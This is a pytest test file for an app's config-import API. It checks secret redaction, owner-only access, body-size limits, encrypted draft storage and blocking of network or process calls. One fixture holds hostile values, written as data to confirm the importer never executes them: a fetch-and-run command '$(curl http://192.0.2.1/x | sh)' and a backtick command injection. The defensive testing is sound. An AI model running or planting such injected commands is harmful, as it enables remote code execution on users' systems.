"""The import routes (app/routers/importers.py) against a real database.

Driven through the real ASGI app so the body cap, the owner guard and the
manual body read are what is tested, not a handler called around them.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import socket
import subprocess
from contextlib import asynccontextmanager
from pathlib import Path
from unittest.mock import AsyncMock, patch

import httpx
import pytest
from fastapi.testclient import TestClient

from app import catalog, database, main
from app.routers import importers

FIX = Path(__file__).parent / "fixtures" / "importers"

# Every secret value in the fixtures used here. None may leave the server.
SECRETS = [
    "fake-pass-honeygain",
    "fake-pass-$iproyal",
    "fake-token-traffmonetizer",
    "fake-token-earnfm",
    "fake-key-proxyrack",
    "fake-pass-bitping",
    "11111111-2222-4333-8444-555555555555",
    "fake-proxy-pass",
    "fake-proxybase-user",
    "fake-pass-grass",
]


def _files(*paths: str) -> list[dict[str, str]]:
    return [{"name": Path(p).name, "content": (FIX / p).read_text(encoding="utf-8")} for p in paths]


M4B = _files("money4band/user-config.json")


@asynccontextmanager
async def _noop_lifespan(_app):
    yield


@pytest.fixture
def db(tmp_path):
    catalog.load_services()

    async def init():
        await database.init_db()
        await database.close_shared()

    with (
        patch.object(database, "DB_DIR", tmp_path),
        patch.object(database, "DB_PATH", tmp_path / "cashpilot.db"),
        patch.object(database, "_fernet_key_is_ephemeral", False),
    ):
        asyncio.run(init())
        yield tmp_path


def _client_as(role: str | None):
    user = {"uid": 1, "u": role, "r": role} if role else None
    return user


@pytest.fixture
def owner(db):
    with (
        patch.object(main.app.router, "lifespan_context", _noop_lifespan),
        patch("app.auth.get_current_user", return_value={"uid": 1, "u": "owner", "r": "owner"}),
        TestClient(main.app, raise_server_exceptions=False) as client,
    ):
        yield client
        # Close the connection on the loop it was opened on, before that loop goes.
        client.portal.call(database.close_shared)


def _run(coro_fn):
    async def go():
        try:
            return await coro_fn()
        finally:
            await database.close_shared()

    return asyncio.run(go())


def _db_bytes(path: Path) -> bytes:
    return b"".join(p.read_bytes() for p in path.iterdir() if p.name.startswith("cashpilot.db"))


def _assert_no_secret(text: str):
    for secret in SECRETS:
        assert secret not in text, f"a secret ({secret[:9]}...) left the server"


# ---------------------------------------------------------------------------
# Preview
# ---------------------------------------------------------------------------


class TestPreview:
    def test_it_returns_rows_without_any_secret(self, owner, caplog):
        caplog.set_level(logging.DEBUG)
        res = owner.post("/api/import/preview", json={"files": M4B})
        assert res.status_code == 200
        body = res.json()
        assert body["source"] == "money4band"
        rows = {r["slug"]: r for r in body["rows"]}
        assert rows["honeygain"]["state"] == "ready"
        assert "env" not in rows["honeygain"]
        assert (
            next(f for f in rows["honeygain"]["fields"] if f["key"] == "HONEYGAIN_EMAIL")["value"] == "hg@example.com"
        )
        assert rows["honeygain"]["collector"] == "will_set"
        assert rows["repocket"]["collector"] == "none"
        assert body["notices"][0].startswith("Stop money4band first")
        _assert_no_secret(res.text)
        _assert_no_secret(caplog.text)

    def test_it_stores_nothing(self, owner, db):
        owner.post("/api/import/preview", json={"files": M4B})
        assert owner.get("/api/import/drafts").json() == []
        for secret in SECRETS:
            assert secret.encode() not in _db_bytes(db)

    def test_an_over_size_body_is_413(self, owner):
        res = owner.post("/api/import/preview", content=b'{"files": "' + b"x" * (300 * 1024) + b'"}')
        assert res.status_code == 413

    def test_an_over_size_file_set_is_413(self, owner):
        half = "A=" + "x" * 1000 + "\n"
        files = [{"name": "a", "content": half * 40}, {"name": "b", "content": half * 40}]
        assert owner.post("/api/import/preview", json={"files": files}).status_code == 413

    @pytest.mark.parametrize(
        "body",
        [
            b"not json",
            b"[1, 2]",
            b"\xff\xfe",
            json.dumps({"files": [{"name": "f", "content": "A=1\x00"}]}).encode(),
            json.dumps({"files": [{"name": "f", "content": "\n" * 6000}]}).encode(),
            json.dumps({"files": [{"name": "f.json", "content": '{"a":' * 3000 + "1" + "}" * 3000}]}).encode(),
            json.dumps({"files": M4B, "source": "other"}).encode(),
        ],
    )
    def test_bad_input_is_a_400_never_a_500(self, owner, body):
        assert owner.post("/api/import/preview", content=body).status_code == 400

    def test_a_refusal_never_echoes_the_file(self, owner):
        files = [{"name": "f", "content": "HONEYGAIN_PASSWD=fake-pass-honeygain\n\x00"}]
        res = owner.post("/api/import/preview", json={"files": files})
        assert res.status_code == 400
        _assert_no_secret(res.text)


# ---------------------------------------------------------------------------
# Who may call it
# ---------------------------------------------------------------------------


ROUTES = [
    ("POST", "/api/import/preview"),
    ("POST", "/api/import/apply"),
    ("GET", "/api/import/drafts"),
    ("POST", "/api/import/drafts/honeygain/deploy?worker_id=1"),
    ("DELETE", "/api/import/drafts/honeygain"),
    ("GET", "/import"),
]


class TestAccess:
    @pytest.mark.parametrize(("method", "path"), ROUTES)
    @pytest.mark.parametrize("role", ["writer", "viewer", "reader"])
    def test_only_the_owner(self, db, method, path, role):
        with (
            patch.object(main.app.router, "lifespan_context", _noop_lifespan),
            patch("app.auth.get_current_user", return_value={"uid": 2, "u": role, "r": role}),
            TestClient(main.app, raise_server_exceptions=False) as client,
        ):
            res = client.request(method, path, content=b"{malformed", follow_redirects=False)
            client.portal.call(database.close_shared)
        assert res.status_code == 403

    @pytest.mark.parametrize(("method", "path"), [r for r in ROUTES if r[1].startswith("/api")])
    def test_anonymous_malformed_body_is_401_not_400(self, db, method, path):
        with (
            patch.object(main.app.router, "lifespan_context", _noop_lifespan),
            patch("app.auth.get_current_user", return_value=None),
            TestClient(main.app, raise_server_exceptions=False) as client,
        ):
            res = client.request(method, path, content=b"{malformed")
            client.portal.call(database.close_shared)
        assert res.status_code == 401

    def test_the_page_renders_for_the_owner(self, owner):
        res = owner.get("/import")
        assert res.status_code == 200
        assert "/static/js/import.js" in res.text


# ---------------------------------------------------------------------------
# Apply
# ---------------------------------------------------------------------------


class TestApply:
    def test_ready_rows_become_encrypted_drafts(self, owner, db, caplog):
        caplog.set_level(logging.DEBUG)
        res = owner.post("/api/import/apply", json={"files": M4B, "slugs": ["honeygain", "repocket", "earnapp"]})
        assert res.status_code == 200, res.text
        assert sorted(res.json()["saved"]) == ["earnapp", "honeygain", "repocket"]
        _assert_no_secret(res.text)
        _assert_no_secret(caplog.text)

        drafts = owner.get("/api/import/drafts")
        assert {d["slug"]: d["keys"] for d in drafts.json()}["honeygain"] == ["HONEYGAIN_EMAIL", "HONEYGAIN_PASSWORD"]
        _assert_no_secret(drafts.text)

        draft = _run(lambda: database.get_import_draft("honeygain"))
        assert draft["env"]["HONEYGAIN_PASSWORD"] == "fake-pass-honeygain"

        async def raw():
            conn = await database._get_db()
            cur = await conn.execute("SELECT env_encrypted FROM import_drafts")
            return [r["env_encrypted"] for r in await cur.fetchall()]

        blobs = _run(raw)
        assert blobs and all(b.startswith("enc:") for b in blobs)
        for secret in SECRETS:
            assert secret.encode() not in _db_bytes(db)

    def test_an_unusable_row_is_refused_even_if_posted(self, owner):
        for slug in ("proxybase", "peer2profit", "grass"):
            res = owner.post("/api/import/apply", json={"files": M4B, "slugs": [slug]})
            assert res.status_code == 400
        assert owner.get("/api/import/drafts").json() == []

    def test_a_row_still_missing_a_field_is_refused(self, owner):
        files = _files("internetincome/properties.conf")
        assert owner.post("/api/import/apply", json={"files": files, "slugs": ["repocket"]}).status_code == 400

    def test_a_typed_value_completes_a_row(self, owner):
        files = _files("internetincome/properties.conf")
        body = {"files": files, "slugs": ["repocket"], "extra": {"repocket": {"RP_EMAIL": "rp@example.com"}}}
        assert owner.post("/api/import/apply", json=body).status_code == 200
        env = _run(lambda: database.get_import_draft("repocket"))["env"]
        assert env == {"RP_EMAIL": "rp@example.com", "RP_API_KEY": "11111111-2222-4333-8444-555555555555"}

    def test_a_typed_value_is_held_to_the_catalog_pattern(self, owner):
        files = [{"name": "properties.conf", "content": "EARNAPP=true\n"}]
        body = {"files": files, "source": "internetincome", "slugs": ["earnapp"]}
        bad = owner.post("/api/import/apply", json={**body, "extra": {"earnapp": {"EARNAPP_UUID": "not-an-id"}}})
        assert bad.status_code == 400
        assert "format" in bad.json()["detail"]
        good_id = "sdk-node-0123456789abcdef0123456789abcdef"
        good = owner.post("/api/import/apply", json={**body, "extra": {"earnapp": {"EARNAPP_UUID": good_id}}})
        assert good.status_code == 200, good.text

    def test_the_rows_ticked_by_default_on_a_template_save(self, owner):
        content = (FIX / "cashfactory/template.env").read_text(encoding="utf-8")
        content = content.replace("HONEYGAIN_EMAIL=<email>", "HONEYGAIN_EMAIL=hg@example.com")
        content = content.replace("HONEYGAIN_PASSWD=<password>", "HONEYGAIN_PASSWD=fake-pass-honeygain")
        files = [{"name": ".env", "content": content}]
        rows = owner.post("/api/import/preview", json={"files": files}).json()["rows"]
        ticked = [r["slug"] for r in rows if r["selected"]]
        assert ticked == ["honeygain"]
        res = owner.post("/api/import/apply", json={"files": files, "slugs": ticked})
        assert res.status_code == 200, res.text

    def test_the_collector_login_is_filled_only_for_the_linked_services(self, owner):
        owner.post("/api/import/apply", json={"files": M4B, "slugs": ["honeygain", "repocket", "bitping"]})
        config = _run(database.get_config)
        assert config.get("honeygain_email") == "hg@example.com"
        assert config.get("honeygain_password") == "fake-pass-honeygain"
        assert config.get("bitping_email") == "bp@example.com"
        assert not config.get("repocket_email")
        assert _run(lambda: database.get_deployment("honeygain"))["status"] == "external"

    def test_a_working_collector_login_is_never_overwritten(self, owner):
        kept = "keep-me"  # ggignore: fake test value, not a credential
        _run(lambda: database.set_config_bulk({"honeygain_email": "keep@example.com", "honeygain_password": kept}))
        owner.post("/api/import/apply", json={"files": M4B, "slugs": ["honeygain"]})
        config = _run(database.get_config)
        assert (config["honeygain_email"], config["honeygain_password"]) == ("keep@example.com", kept)
        rows = owner.post("/api/import/preview", json={"files": M4B}).json()["rows"]
        assert next(r for r in rows if r["slug"] == "honeygain")["collector"] == "already_set"

    def test_a_half_set_earnings_login_is_reported_and_left_alone(self, owner):
        _run(lambda: database.set_config_bulk({"honeygain_email": "keep@example.com"}))
        rows = owner.post("/api/import/preview", json={"files": M4B}).json()["rows"]
        assert next(r for r in rows if r["slug"] == "honeygain")["collector"] == "partly_set"
        res = owner.post("/api/import/apply", json={"files": M4B, "slugs": ["honeygain"]})
        assert "honeygain" not in res.json()["collectors_set"]
        config = _run(database.get_config)
        assert config["honeygain_email"] == "keep@example.com" and not config.get("honeygain_password")

    def test_an_earnings_only_entry_is_not_called_deployed(self, owner):
        _run(lambda: database.save_deployment(slug="honeygain", container_id="", status="external"))
        _run(lambda: database.save_deployment(slug="repocket", container_id="abc", status="running"))
        rows = {r["slug"]: r for r in owner.post("/api/import/preview", json={"files": M4B}).json()["rows"]}
        assert rows["honeygain"]["existing"]["deployed"] is False
        assert rows["repocket"]["existing"]["deployed"] is True

    @pytest.mark.parametrize("apps", [[1], "x", 5])
    def test_an_apps_value_that_is_not_an_object_is_a_400(self, owner, apps):
        files = [{"name": "user-config.json", "content": json.dumps({"apps": apps})}]
        res = owner.post("/api/import/preview", json={"source": "money4band", "files": files})
        assert res.status_code == 400, res.text
        assert "apps" in res.json()["detail"]

    def test_a_failed_save_names_what_was_already_saved(self, owner):
        real = database.save_import_draft

        async def second_fails(slug, source, env):
            if slug == "repocket":
                raise RuntimeError("disk I/O error")
            return await real(slug, source, env)

        with patch.object(database, "save_import_draft", side_effect=second_fails):
            res = owner.post("/api/import/apply", json={"files": M4B, "slugs": ["honeygain", "repocket"]})
        assert res.status_code == 500
        detail = res.json()["detail"]
        assert "Already saved: honeygain." in detail and "Repocket" in detail
        assert "disk I/O" not in res.text  # the exception text never reaches the browser
        assert [d["slug"] for d in owner.get("/api/import/drafts").json()] == ["honeygain"]

    def test_overlapping_applies_set_the_earnings_login_once(self, db):
        config: dict[str, str] = {}
        calls: list[dict[str, str]] = []
        payload = json.dumps({"files": M4B, "slugs": ["honeygain"]}).encode()

        class _Req:
            async def stream(self):
                yield payload

        async def get_config():
            return dict(config)

        async def set_collector_config(keys):
            await asyncio.sleep(0.01)  # let the other apply run in between
            calls.append(keys)
            config.update(keys)

        async def both():
            await asyncio.gather(
                importers.apply(_Req(), set_collector_config), importers.apply(_Req(), set_collector_config)
            )

        with (
            patch.object(database, "get_config", side_effect=get_config),
            patch.object(database, "save_import_draft", AsyncMock()),
        ):
            asyncio.run(both())
        assert len(calls) == 1

    def test_refused_under_an_ephemeral_key(self, owner):
        with patch.object(database, "_fernet_key_is_ephemeral", True):
            res = owner.post("/api/import/apply", json={"files": M4B, "slugs": ["honeygain"]})
        assert res.status_code == 409
        assert owner.get("/api/import/drafts").json() == []

    @pytest.mark.parametrize(
        "body",
        [
            {"files": M4B},
            {"files": M4B, "slugs": []},
            {"files": M4B, "slugs": [1]},
            {"files": M4B, "slugs": ["honeygain"], "extra": []},
            {"files": M4B, "slugs": ["honeygain"], "extra": {"honeygain": "x"}},
            {"files": M4B, "slugs": ["not-in-files"]},
        ],
    )
    def test_malformed_apply_is_400(self, owner, body):
        assert owner.post("/api/import/apply", json=body).status_code == 400


# ---------------------------------------------------------------------------
# Deploy a draft, and forget it
# ---------------------------------------------------------------------------


class TestDraftDeploy:
    def _deploy(self, owner, slug, captured):
        async def capture(worker_id, slug_, spec):
            captured.append((worker_id, slug_, dict(spec)))
            return {"container_id": "abc"}

        with (
            patch.object(main, "_resolve_worker_id", AsyncMock(return_value=7)),
            patch.object(main, "_proxy_worker_deploy", capture),
            patch.object(main.database, "get_deployment_spec", AsyncMock(return_value=None)),
            patch.object(main.database, "save_deployment", AsyncMock()),
            patch.object(main.database, "record_health_event", AsyncMock()),
            patch.object(main, "_spawn", lambda coro: coro.close()),
            patch.object(main, "_register_device", AsyncMock(return_value=False)),
        ):
            return owner.post(f"/api/import/drafts/{slug}/deploy?worker_id=7")

    def test_the_draft_env_reaches_the_worker_through_api_deploy(self, owner):
        owner.post("/api/import/apply", json={"files": M4B, "slugs": ["earnapp", "honeygain"]})
        captured: list = []
        res = self._deploy(owner, "earnapp", captured)
        assert res.status_code == 200, res.text
        assert captured[0][0] == 7
        assert captured[0][2]["env"]["EARNAPP_UUID"] == "sdk-node-0123456789abcdef0123456789abcdef"
        assert res.json()["device_link"]["id"] == "sdk-node-0123456789abcdef0123456789abcdef"

        res = self._deploy(owner, "honeygain", captured)
        assert res.status_code == 200
        assert "-pass fake-pass-honeygain" in captured[1][2]["command"]
        _assert_no_secret(res.text)

    def test_a_draft_missing_a_required_field_is_refused_by_api_deploy(self, owner):
        _run(lambda: database.save_import_draft("honeygain", "money4band", {"HONEYGAIN_EMAIL": "hg@example.com"}))
        captured: list = []
        res = self._deploy(owner, "honeygain", captured)
        assert res.status_code == 400
        assert "Missing required fields" in res.json()["detail"]
        assert captured == []

    def test_no_draft_is_404(self, owner):
        assert self._deploy(owner, "honeygain", []).status_code == 404

    def test_forget(self, owner):
        owner.post("/api/import/apply", json={"files": M4B, "slugs": ["honeygain"]})
        assert owner.delete("/api/import/drafts/honeygain").status_code == 200
        assert owner.get("/api/import/drafts").json() == []
        assert owner.delete("/api/import/drafts/honeygain").status_code == 404


# ---------------------------------------------------------------------------
# Nothing is run and nothing is fetched
# ---------------------------------------------------------------------------


class _Blocked(Exception):
    pass


def _boom(*_a, **_k):
    raise _Blocked("the importer reached out")


class TestNoNetworkNoProcess:
    def _blocked(self):
        return [
            patch.object(socket, "create_connection", _boom),
            patch.object(socket.socket, "connect", _boom),
            patch.object(subprocess, "Popen", _boom),
            patch.object(os, "system", _boom),
            patch.object(httpx.AsyncClient, "send", _boom),
            # Not httpx.Client.send: the test client is an httpx.Client. The real
            # transports are what any outbound request would go through.
            patch.object(httpx.HTTPTransport, "handle_request", _boom),
            patch.object(httpx.AsyncHTTPTransport, "handle_async_request", _boom),
        ]

    def test_the_patches_fire(self):
        """Positive control: each patched call does raise."""
        patches = self._blocked()
        for p in patches:
            p.start()
        try:
            for call in (
                lambda: socket.create_connection(("192.0.2.1", 1)),
                lambda: subprocess.Popen(["true"]),
                lambda: os.system("true"),
                lambda: asyncio.run(httpx.AsyncClient().send(httpx.Request("GET", "http://192.0.2.1"))),
                lambda: httpx.Client().get("http://192.0.2.1"),
            ):
                with pytest.raises(_Blocked):
                    call()
        finally:
            for p in patches:
                p.stop()

    def test_preview_and_apply_touch_neither(self, owner):
        hostile = [
            {
                "name": "properties.conf",
                "content": (
                    "IPROYALS_EMAIL='ip@example.com'\n"
                    "IPROYALS_PASSWORD=$(curl http://192.0.2.1/x | sh)\n"
                    "HONEYGAIN_EMAIL=hg@example.com\nHONEYGAIN_PASSWORD=`id`\n"  # ggignore: fake test value, not a credential
                    "REPOCKET_API=http://192.0.2.1/payload\n"
                ),
            }
        ]
        patches = self._blocked()
        # The test client talks to the app in-process, without sockets, so the
        # patches see only what the importer itself would do.
        for p in patches:
            p.start()
        try:
            preview = owner.post("/api/import/preview", json={"files": hostile})
            apply = owner.post("/api/import/apply", json={"files": M4B, "slugs": ["honeygain"]})
        finally:
            for p in patches:
                p.stop()
        assert preview.status_code == 200, preview.text
        assert apply.status_code == 200, apply.text
        rows = {r["slug"]: r for r in preview.json()["rows"]}
        states = {f["key"]: f["state"] for f in rows["iproyal"]["fields"]}
        assert states["IPROYALPAWNS_PASSWORD"] == "retype"
        assert {f["key"]: f["state"] for f in rows["honeygain"]["fields"]}["HONEYGAIN_PASSWORD"] == "retype"


def test_the_router_reads_the_body_by_hand():
    """No pydantic body model: a 422 would echo the pasted passwords."""
    import inspect

    for fn in (importers.api_import_preview, main.api_import_apply):
        params = inspect.signature(fn).parameters
        assert set(params) == {"request", "_auth"} or set(params) == {"request", "user"}
